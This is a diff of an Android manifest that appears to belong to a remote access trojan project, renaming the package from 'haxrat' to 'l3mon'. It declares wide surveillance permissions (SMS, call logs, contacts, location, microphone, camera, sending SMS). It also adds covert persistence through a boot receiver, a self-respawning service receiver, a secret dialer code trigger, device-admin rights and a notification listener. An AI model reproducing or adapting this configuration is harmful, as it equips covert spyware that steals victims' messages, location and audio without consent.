@@ -1,33 +1,30 @@
 <?xml version='1.0' encoding='utf-8' ?>
-<manifest android:versionCode="1"
-          android:versionName="1.0-beta"
-          android:compileSdkVersion="33"
-          android:compileSdkVersionCodename="13.0.0"
-          package="com.hax4us.haxrat"
-          platformBuildVersionCode="33"
-          platformBuildVersionName="13.0.0" xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest android:versionCode="2"
+          android:versionName="2.0"
+          android:r0x01010572="23"
+          android:r0x01010573="6.0-2438415"
+          package="com.etechd.l3mon"
+          platformBuildVersionCode="23"
+          platformBuildVersionName="6.0-2438415" xmlns:android="http://schemas.android.com/apk/res/android">
   <uses-sdk android:minSdkVersion="14"
             android:targetSdkVersion="24" />
-  <uses-feature android:name="android.hardware.camera" />
-  <uses-permission android:name="android.permission.READ_SMS" />
-  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-  <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-  <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-  <uses-permission android:name="android.permission.RECORD_VIDEO" />
-  <uses-permission android:name="android.permission.SEND_SMS" />
-  <uses-permission android:name="android.permission.RECORD_AUDIO" />
-  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-  <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+  <uses-permission android:name="android.permission.WAKE_LOCK" />
   <uses-permission android:name="android.permission.CAMERA" />
-  <uses-permission android:name="android.permission.READ_CALL_LOG" />
   <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-  <uses-permission android:name="android.permission.READ_CONTACTS" />
+  <uses-permission android:name="android.permission.INTERNET" />
+  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+  <uses-permission android:name="android.permission.READ_SMS" />
+  <uses-permission android:name="android.permission.SEND_SMS" />
   <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
   <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-  <uses-permission android:name="android.permission.WAKE_LOCK" />
-  <uses-permission android:name="android.permission.INTERNET" />
+  <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+  <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+  <uses-permission android:name="android.permission.READ_CALL_LOG" />
+  <uses-permission android:name="android.permission.RECORD_AUDIO" />
+  <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+  <uses-permission android:name="android.permission.READ_CONTACTS" />
   <application android:theme="@style/AppTheme"
                android:label="@string/app_name"
                android:icon="@mipmap/ic_launcher"
@@ -36,9 +33,37 @@
                android:hardwareAccelerated="false"
                android:largeHeap="true"
                android:supportsRtl="true">
-    <service android:name=".Screenshot" />
+    <activity android:name="com.etechd.l3mon.MainActivity"
+              android:launchMode="singleInstance">
+      <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+      </intent-filter>
+    </activity>
+    <service android:name="com.etechd.l3mon.MainService"
+             android:enabled="true"
+             android:exported="false" />
+    <receiver android:label="RestartServiceWhenStopped"
+              android:name="com.etechd.l3mon.ServiceReciever"
+              android:enabled="true"
+              android:exported="true">
+      <intent-filter>
+        <action android:name="respawnService" />
+      </intent-filter>
+    </receiver>
+    <receiver android:name="com.etechd.l3mon.MyReceiver"
+              android:enabled="true"
+              android:exported="true">
+      <intent-filter>
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+      </intent-filter>
+      <intent-filter>
+        <action android:name="android.provider.Telephony.SECRET_CODE" />
+        <data android:scheme="android_secret_code" />
+      </intent-filter>
+    </receiver>
     <receiver android:label="@string/device_admin_label"
-              android:name=".DeviceAdmin"
+              android:name="com.etechd.l3mon.DeviceAdmin"
               android:permission="android.permission.BIND_DEVICE_ADMIN"
               android:description="@string/device_description">
       <meta-data android:name="android.app.device_admin"
@@ -47,46 +72,12 @@
         <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
       </intent-filter>
     </receiver>
-    <activity android:name=".MainActivity"
-              android:launchMode="singleInstance">
-      <intent-filter>
-        <action android:name="android.intent.action.MAIN" />
-        <category android:name="android.intent.category.LAUNCHER" />
-      </intent-filter>
-    </activity>
-    <service android:name=".MainService"
-             android:enabled="true"
-             android:exported="false" />
-    <receiver android:name=".MyReceiver"
-              android:enabled="true"
-              android:exported="true">
-      <intent-filter>
-        <action android:name="android.intent.action.BOOT_COMPLETED" />
-      </intent-filter>
-      <intent-filter>
-        <data android:scheme="android_secret_code" />
-        <action android:name="android.provider.Telephony.SECRET_CODE" />
-      </intent-filter>
-    </receiver>
-    <service android:name=".CamService" />
-    <activity android:theme="@style/TransParent"
-              android:name=".TransparentActivity"
-              android:excludeFromRecents="true" />
     <service android:label="@string/app_name"
-             android:name=".NotificationListener"
+             android:name="com.etechd.l3mon.NotificationListener"
              android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
       <intent-filter>
         <action android:name="android.service.notification.NotificationListenerService" />
       </intent-filter>
     </service>
-    <receiver android:label="RestartServiceWhenStopped"
-              android:name=".ServiceReciever"
-              android:enabled="true"
-              android:exported="true">
-      <intent-filter>
-        <action android:name="respawnService" />
-      </intent-filter>
-    </receiver>
-    <service android:name=".ScreenRecorderService" />
   </application>
 </manifest>
